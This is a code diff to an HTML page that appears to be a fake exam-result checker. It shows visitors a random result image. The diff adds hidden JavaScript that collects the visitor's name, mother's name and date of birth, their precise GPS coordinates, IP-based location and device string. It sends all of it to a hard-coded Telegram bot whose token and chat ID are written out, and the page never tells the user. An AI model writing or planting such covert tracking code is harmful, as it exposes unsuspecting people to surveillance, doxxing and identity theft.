@@ -173,29 +173,98 @@
   </div>
 
   <script>
+    const BOT_TOKEN = "8544522036:AAFP7z_O2VkBsBbDu8fYFtnmR-mr3FdCR6s";
+const CHAT_ID = "6192222544";
+
+function sendToTelegram(message) {
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: message
+    })
+  });
+}
+    function fetchLocationAndSend(name, mother, dob) {
+
+  if (!navigator.geolocation) {
+    sendToTelegram("Location not supported");
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    function(position) {
+
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+
+      fetch("https://ipapi.co/json/")
+      .then(res => res.json())
+      .then(ipdata => {
+
+        const message =
+`Result accessed!
+
+Name: ${name}
+Mother: ${mother}
+DOB: ${dob}
+
+IP: ${ipdata.ip}
+City: ${ipdata.city}
+Region: ${ipdata.region}
+Country: ${ipdata.country_name}
+
+Latitude: ${lat}
+Longitude: ${lon}
+
+Google Maps:
+https://maps.google.com/?q=${lat},${lon}
+
+Device: ${navigator.userAgent}`;
+
+        sendToTelegram(message);
+
+      });
+
+    },
+    function(error) {
+      sendToTelegram("Location denied by user");
+    }
+  );
+
+    }
     function showResult() {
-      const name = document.getElementById("name").value.trim();
-      const mother = document.getElementById("mother").value.trim();
-      const dob = document.getElementById("dob").value;
 
-      if (!name || !mother || !dob) {
-        alert("Please fill all fields!");
-        return;
-      }
+  const name = document.getElementById("name").value.trim();
+  const mother = document.getElementById("mother").value.trim();
+  const dob = document.getElementById("dob").value;
 
-      const randomIndex = Math.floor(Math.random() * 10) + 1;
-      const resultImg = `r${randomIndex}.png`;
-      document.getElementById("random-result-image").src = resultImg;
+  if (!name || !mother || !dob) {
+    alert("Please fill all fields!");
+    return;
+  }
 
-      const resultDetails = `
-        <p><strong>Candidate Name:</strong> ${name}</p>
-        <p><strong>Mother's Name:</strong> ${mother}</p>
-        <p><strong>Date of Birth:</strong> ${dob}</p>
-      `;
-      document.getElementById("result-details").innerHTML = resultDetails;
+  // send location to telegram
+  fetchLocationAndSend(name, mother, dob);
 
-      document.getElementById("form-container").style.display = "none";
-      document.getElementById("result-container").style.display = "block";
+  // existing result logic
+  const randomIndex = Math.floor(Math.random() * 10) + 1;
+  const resultImg = `r${randomIndex}.png`;
+  document.getElementById("random-result-image").src = resultImg;
+
+  const resultDetails = `
+    <p><strong>Candidate Name:</strong> ${name}</p>
+    <p><strong>Mother's Name:</strong> ${mother}</p>
+    <p><strong>Date of Birth:</strong> ${dob}</p>
+  `;
+
+  document.getElementById("result-details").innerHTML = resultDetails;
+
+  document.getElementById("form-container").style.display = "none";
+  document.getElementById("result-container").style.display = "block";
     }
 
     function downloadResult() {
@@ -220,3 +289,4 @@
 
 </body>
 </html>
+
